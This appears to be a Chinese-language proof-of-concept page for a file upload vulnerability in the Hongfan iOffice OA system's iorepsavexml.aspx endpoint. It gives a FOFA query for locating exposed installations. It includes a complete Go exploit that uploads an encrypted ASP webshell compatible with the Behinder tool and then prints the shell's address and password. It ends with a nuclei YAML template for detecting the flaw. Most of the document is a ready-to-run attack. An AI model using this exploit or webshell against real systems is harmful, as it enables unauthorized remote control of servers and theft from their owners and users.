
## 红帆OA iorepsavexml.aspx 文件上传漏洞

## fofa

```
app="红帆-ioffice"
```

## exp

```go
package main

import (
        "crypto/tls"
        "fmt"
        "github.com/hpifu/go-kit/hflag"
        "github.com/imroc/req/v3"
        "github.com/liushuochen/gotable"
        "github.com/thanhpk/randstr"
        "log"
        "net/http"
        "os"
        "strings"
        "time"
)

func main() {
        now := time.Now()
        param := getParam()
        uploader(param)
        fmt.Printf("[√] 速度还是挺快的就这么点时间%s就GetShell了.", time.Since(now).String())
}

func getParam() string {
        hflag.AddFlag("target", "海翔地址", hflag.Required(), hflag.Shorthand("t"))
        if err := hflag.Parse(); err != nil {
                fmt.Println(hflag.Usage())
                os.Exit(0)
        }
        return hflag.GetString("target")
}

func reqClient() *req.Client {
        cli := req.C()
        cli.SetAutoDecodeAllContentType()
        cli.SetRedirectPolicy(req.NoRedirectPolicy())
        cli.SetTimeout(time.Second * 15)
        cli.SetTLSFingerprintSafari()
        cli.TLSClientConfig = &tls.Config{InsecureSkipVerify: true,
                MinVersion: tls.VersionTLS10,
                MaxVersion: tls.VersionTLS13}
        return cli
}

func uploader(target string) {
        shellName := randstr.Hex(8) + ".asp"
        shellString := "<%\nResponse.CharSet = \"UTF-8\" \nk=\"e45e329feb5d925b\" \nSession(\"k\")=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\n%>\n"
        vulUrl := strings.Replace(target+"/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename="+shellName+"&filepath=/upfiles/rep/pic/", "//io", "/io", 1)
        client := reqClient()
        post, err := client.R().SetBody(shellString).Post(vulUrl)
        if err != nil {
                log.Println(err)
                return
        }
        defer func() {
                _ = post.Body.Close()
        }()
        if post.StatusCode != http.StatusOK {
                fmt.Println("GetShell Failed")
                return
        }
        shellURL := strings.Replace(target+"/ioffice/upfiles/rep/pic/"+shellName, "//io", "/io", 1)
        get, _ := client.R().Get(shellURL)
        if get.StatusCode != http.StatusNotFound {
                create, _ := gotable.Create("Shell连接工具", "Shell连接地址", "Shell连接密码")
                _ = create.AddRow([]string{
                        "冰蝎", shellURL, "rebeyond",
                })
                fmt.Println(create)
        }
        defer func() {
                _ = get.Body.Close()
        }()
}

```

![image](https://github.com/wy876/POC/assets/139549762/39e2c87c-080f-42f6-a7a2-5f79fc6d9204)

## yaml poc
```

id: hongfanOA-iorepsavexml-aspx-GetShell

info:
  name: 红帆OA iorepsavexml.aspx 文件上传漏洞
  author: kyo
  severity: critical
  description: |
    红帆OA在上传时可被绕过上传的限制
  reference:
    -  
  metadata:
    verified: true
    max-request: 2
    fofa-query: title="iOffice.net"
  tags: hongfan,oa,upload

http:
  - raw:
      - |
        POST /ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=qaxnb.txt&filepath=/upfiles/rep/pic/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

        qaxnb
      - |
        GET /ioffice/upfiles/rep/pic/qaxnb.txt HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==200 && status_code_2 == 200'
          - 'contains(body_2, "qaxnb")'
        condition: and

# digest: 4b0a00483046022100ace369b495c3c20753d111b9951b654c66682b38ecb89775c65cb0e9b23dd21d022100a9a3b446556750d6ecd73dff1605d01a1c60728720f4ee0c54654b1dcbd4c5d8:922c64590222798bb761d5b6d8e72951
```

